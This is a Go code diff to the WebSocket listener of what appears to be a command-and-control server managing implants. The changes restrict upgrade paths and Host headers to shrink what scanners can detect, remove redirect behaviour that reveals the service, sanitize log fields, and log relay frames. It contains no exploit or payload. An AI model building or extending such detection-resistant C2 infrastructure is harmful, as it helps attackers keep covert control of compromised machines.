@@ -74,6 +74,15 @@ func NewListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskMgr T
 	}
 
 	wsServer := transport.NewServer()
+	// 主动探测面收敛（v1.4.0 S5 第 0 步）：只允许配置的那一条路径升级，可选 Host
+	// 白名单；被拒的握手经 onUpgradeReject 落结构化日志。策略放在 transport 层
+	// 执行（那里才知道"请求行原样长什么样"），日志策略放在这里（服务端才知道
+	// 什么该记、记多少）。
+	wsServer.SetUpgradePolicy(transport.UpgradePolicy{
+		Path:          cfg.WSPath,
+		HostAllowlist: cfg.WSHostAllowlist,
+	})
+
 	listener := &Listener{
 		sessionMgr:  sessMgr,
 		taskMgr:     taskMgr,
@@ -85,6 +94,7 @@ func NewListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskMgr T
 		stopOnce:    sync.Once{},
 		checkerOnce: sync.Once{},
 	}
+	wsServer.SetOnUpgradeReject(listener.onUpgradeReject)
 	if cfg.HeartbeatTimeout > 0 {
 		listener.heartbeatTimeout = cfg.HeartbeatTimeout
 	} else {
@@ -112,8 +122,58 @@ func (l *Listener) SetOnSessionOnline(cb func(info *types.SessionInfo)) { l.onSe
 // SetOnScreenFrame sets a callback invoked when a screen frame arrives.
 func (l *Listener) SetOnScreenFrame(cb func(sessionID string, payload []byte)) { l.onScreenFrame = cb }
 
-// ListRelayNodes WebSocket 监听器不提供中继节点（与 HTTP 对齐）。
-func (l *Listener) ListRelayNodes() []types.RelayNode { return nil }
+// ListRelayNodes WebSocket 监听器不提供中继节点：链式回连（Beacon Mesh）只在
+// TCP 通道实现（见 SupportsRelayChannel 的说明）。
+//
+// 返回**非 nil 空切片**而不是 nil：与 HTTPListener.ListRelayNodes 逐字一致
+// （nil 会被上层归一成 []，但两处写成一个样子能省掉"到底支不支持"的猜测）。
+func (l *Listener) ListRelayNodes() []types.RelayNode { return []types.RelayNode{} }
+
+// onUpgradeReject 记录被拒绝的 WebSocket 升级尝试（结构化：原因 / 路径 / Host /
+// 远端 IP）。
+//
+// 噪声过滤：只记录"看起来在尝试 WS 升级"的请求，以及"Host 不在白名单"的请求。
+// 公网背景噪声里大量随机路径的普通 GET（扫目录、扫端口、favicon）不该把日志刷满，
+// 否则真正的 WS 探测反而被淹没 —— 这也是为什么 transport 层把 HandshakeAttempt
+// 一并带上来而不是在这里重新判。
+//
+// 不记录请求头集合、不记录 query：拒绝日志要能回答"是不是有人在扫我"，但记全量
+// 头/URL 有把 Cookie/Authorization/token 写进日志的风险（凭据类内容一律不落）。
+func (l *Listener) onUpgradeReject(info transport.UpgradeReject) {
+	if !info.HandshakeAttempt && info.Reason != transport.RejectHostNotAllowed {
+		return
+	}
+	extra := ""
+	if info.RawPath != "" && info.RawPath != info.Path {
+		extra = " raw_path=" + sanitizeLogField(info.RawPath)
+	}
+	logging.Warn("listener", "websocket upgrade rejected: reason=%s path=%s%s host=%s remote_ip=%s",
+		info.Reason, sanitizeLogField(info.Path), extra, sanitizeLogField(info.Host), sanitizeLogField(info.RemoteIP))
+}
+
+// sanitizeLogField 把请求里可控的字段（路径 / Host / 远端地址）压成日志安全串。
+//
+// 为什么必须做：logging 的 json 格式是把 message 直接 fmt.Sprintf 进 JSON 字符串的
+// （见 internal/server/logging/logging.go）—— 字段里出现 `"`、`\` 或换行就能撕开/
+// 伪造日志行（日志注入）。这里只保留可见 ASCII（0x20~0x7E），其余一律替换成 '?'，
+// 并截断长度防止用超长路径刷日志体积。
+func sanitizeLogField(s string) string {
+	const maxLen = 256
+	var b strings.Builder
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if c < 0x20 || c > 0x7E || c == '"' || c == '\\' {
+			b.WriteByte('?')
+		} else {
+			b.WriteByte(c)
+		}
+		if b.Len() >= maxLen {
+			b.WriteString("...")
+			break
+		}
+	}
+	return b.String()
+}
 
 func (l *Listener) PushTask(sessionID string, taskInfo *types.TaskInfo) error {
 	conn, err := l.sessionMgr.GetConnection(sessionID)
@@ -339,9 +399,6 @@ func (l *Listener) Start() error {
 		return fmt.Errorf("listener disabled")
 	}
 
-	mux := http.NewServeMux()
-	mux.Handle("/", l.wsServer)
-
 	addr := fmt.Sprintf("%s:%d", l.cfg.Host, l.cfg.Port)
 	// 先同步 bind，端口占用立即返回错误（而非 goroutine 静默失败）
 	ln, err := net.Listen("tcp", addr)
@@ -349,8 +406,13 @@ func (l *Listener) Start() error {
 		return fmt.Errorf("failed to listen on %s: %v", addr, err)
 	}
 	l.server = &http.Server{
-		Addr:         addr,
-		Handler:      mux,
+		Addr: addr,
+		// 直接挂 WebSocket handler，**不过 http.ServeMux**：ServeMux 会先把
+		// `//`、`/./`、`..` 清洗成规范路径并对变形请求回 301 重定向 —— 那是
+		// ServeMux 的通用行为，但 ① 对探测者仍是"这里有个会转发的服务"的额外
+		// 信号，② 清洗后的路径让"变形尝试"无法在传输层被观察到。这里改为由
+		// transport.Server 自己对原始请求做严格比较，一切不匹配统一走普通 404。
+		Handler:      l.wsServer,
 		ReadTimeout:  30 * time.Second,
 		WriteTimeout: 30 * time.Second,
 		IdleTimeout:  120 * time.Second,
@@ -485,6 +547,30 @@ func (l *Listener) handleMessage(conn *transport.Conn, data []byte) {
 		if l.onScreenFrame != nil {
 			l.onScreenFrame(fmt.Sprintf("%x", packet.ID), packet.Payload)
 		}
+	case protocol.TypeRelayStatus:
+		// 中继植入体上报"我在监听"的帧（{"addr":...}）——服务端在 WS 通道上
+		// 不维护中继节点表，这里只留一条日志，把操作员从"任务回报成功"的错觉里
+		// 拉出来（见下面 TypeRelay 的说明）。
+		var st struct {
+			Addr string `json:"addr"`
+		}
+		_ = json.Unmarshal(packet.Payload, &st)
+		logging.Warn("listener", "relay status frame on websocket channel ignored (relay is TCP-only): session=%s addr=%s",
+			fmt.Sprintf("%x", packet.ID), sanitizeLogField(st.Addr))
+	case protocol.TypeRelay:
+		// 中继（Beacon Mesh）只在 TCP 通道实现：上行解包（unwrapRelayPayload）、
+		// 下行包装（sendOrQueue→wrapAndSend）、子会话注册（handleRegisterRelayed）
+		// 以及隧道 raw 帧的 SM4 密钥（sm4Key）全部挂在 TCPListener 上，子帧沿用的
+		// 也是 TCP 的 [4B len][1B type][cipher] 格式，而不是 WS 的"裸 AES-GCM 消息"。
+		//
+		// WS 通道收到这类帧 = 中继植入体把自己的 C2 通道建在了 WS 上：植入端确实
+		// 开始监听了，但上行子帧在服务端无处可解 —— 子植入体永远上不了线。这里
+		// **显式记日志**而不是静默丢弃：静默失败会让操作员以为中继在跑（任务回报
+		// "relay listener started"），实际一个子节点都不会出现。
+		// 同一问题在 API 侧由 relayControlHandler 直接 409 拒绝（见 handlers_relay.go）。
+		// 负载是二进制（routeID + 子帧密文），只记长度、不记内容。
+		logging.Warn("listener", "relay frame on websocket channel ignored (relay is TCP-only): session=%s bytes=%d",
+			fmt.Sprintf("%x", packet.ID), len(packet.Payload))
 	}
 }
 
